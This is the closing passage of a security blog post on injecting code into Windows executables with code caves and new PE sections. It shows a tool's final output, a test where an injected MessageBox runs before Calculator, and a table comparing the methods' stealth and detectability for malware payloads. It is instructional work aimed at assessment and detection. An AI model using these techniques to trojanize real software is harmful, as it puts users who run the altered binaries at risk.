[6] Entry: 0x18C0 → 0x9000

[Success] Calculator_final.exe
</span></pre></table></code></div></div><p><strong>Testing:</strong></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Calculator_final.exe</span><span class="w">
</span></pre></table></code></div></div><p><a href="/assets/img/posts/binary-injection-in-windows-app/section-messagebox.png" class="popup img-link shimmer"><img src="/assets/img/posts/binary-injection-in-windows-app/section-messagebox.png" alt="Section injection success" loading="lazy"></a> <em>MessageBox appears, then Calculator runs normally</em></p><p>Success! Section addition method works perfectly.</p><h2 id="code-cave-vs-section-addition"><span class="me-2">Code Cave vs Section Addition</span><a href="#code-cave-vs-section-addition" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>Aspect<th>Code Cave<th>Section Addition<tbody><tr><td><strong>Stealth</strong><td>Higher (existing space)<td>Lower (new section)<tr><td><strong>Size Limit</strong><td>Limited (&lt;1KB usually)<td>Flexible (KB to MB)<tr><td><strong>Complexity</strong><td>Find suitable cave<td>Create structure<tr><td><strong>Detection</strong><td>Harder to spot<td>Easier (unusual names)<tr><td><strong>Reliability</strong><td>Depends on caves<td>Always works<tr><td><strong>Use Case</strong><td>Small payloads<td>Large payloads</table></div><p><strong>Real-world usage:</strong></p><ul><li><strong>Code caves</strong>: Small payloads, initial loaders<li><strong>Section addition</strong>: Large payloads, main malware components</ul><h2 id="conclusion"><span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We demonstrated binary injection using code cave and section addition methods. Both techniques successfully inject malicious code into executables while maintaining original functionality.</p><p>These techniques are essential for security professionals to understand offensive capabilities and defensive detection. During assessments, verify executable integrity and look for indicators of modification such as unusual sections or suspicious entry points.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/windows-app-security/">Windows App Security</a>, <a href="/categories/winapp-techniques/">WinApp Techniques</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/binary-injection/" class="post-tag no-text-decoration" >binary-injection</a> <a href="/tags/pe-analysis/" class="post-tag no-text-decoration" >pe-analysis</a> <a href="/tags/code-injection/" class="post-tag no-text-decoration" >code-injection</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Binary%20Injection%20in%20Windows%20Applications%20-%20Nairpaa&url=https%3A%2F%2Fblog.nairpaa.me%2Fposts%2Fbinary-injection-in-windows-app%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Binary%20Injection%20in%20Windows%20Applications%20-%20Nairpaa&u=https%3A%2F%2Fblog.nairpaa.me%2Fposts%2Fbinary-injection-in-windows-app%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fblog.nairpaa.me%2Fposts%2Fbinary-injection-in-windows-app%2F&text=Binary%20Injection%20in%20Windows%20Applications%20-%20Nairpaa" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/portswigger-information-disclosure/">PortSwigger Academy - Information Disclosure</a><li class="text-truncate lh-lg"> <a href="/posts/binary-injection-in-windows-app/">Binary Injection in Windows Applications</a><li class="text-truncate lh-lg"> <a href="/posts/web-recon-enum-cheatsheet/">Web Reconnaissance & Enumeration Cheatsheet</a><li class="text-truncate lh-lg"> <a href="/posts/code-signing-in-windows-app/">Code Signing in Windows Applications</a><li class="text-truncate lh-lg"> <a href="/posts/identify-tech-stack-in-windows-app/">Identifying Technology Stack in Windows Applications</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/enumeration/">enumeration</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/pe-analysis/">pe-analysis</a> <a class="post-tag btn btn-outline-primary" href="/tags/technology-detection/">technology-detection</a> <a class="post-tag btn btn-outline-primary" href="/tags/binary-injection/">binary-injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/certificate-analysis/">certificate-analysis</a> <a class="post-tag btn btn-outline-primary" href="/tags/code-injection/">code-injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/code-signing/">code-signing</a> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a> <a class="post-tag btn btn-outline-primary" href="/tags/debugging/">debugging</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/identify-tech-stack-in-windows-app/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1767348240" data-df="ll" > Jan 2, 2026 </time><h4 class="pt-0 my-2">Identifying Technology Stack in Windows Applications</h4><div class="text-muted"><p>Guide to identifying programming languages, frameworks, and technologies in Windows applications.</p></div></div></a></article><article class="col"> <a href="/posts/code-signing-in-windows-app/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1767537960" data-df="ll" > Jan 4, 2026 </time><h4 class="pt-0 my-2">Code Signing in Windows Applications</h4><div class="text-muted"><p>Understanding and verifying digital signatures in Windows applications.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/web-recon-enum-cheatsheet/" class="btn btn-outline-primary" aria-label="Older" ><p>Web Reconnaissance & Enumeration Cheatsheet</p></a> <a href="/posts/portswigger-information-disclosure/" class="btn btn-outline-primary" aria-label="Newer" ><p>PortSwigger Academy - Information Disclosure</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2026</time> <a href="https://www.linkedin.com/in/nairpaa">Nairpaa</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/enumeration/">enumeration</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/pe-analysis/">pe-analysis</a> <a class="post-tag btn btn-outline-primary" href="/tags/technology-detection/">technology-detection</a> <a class="post-tag btn btn-outline-primary" href="/tags/binary-injection/">binary-injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/certificate-analysis/">certificate-analysis</a> <a class="post-tag btn btn-outline-primary" href="/tags/code-injection/">code-injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/code-signing/">code-signing</a> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a> <a class="post-tag btn btn-outline-primary" href="/tags/debugging/">debugging</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
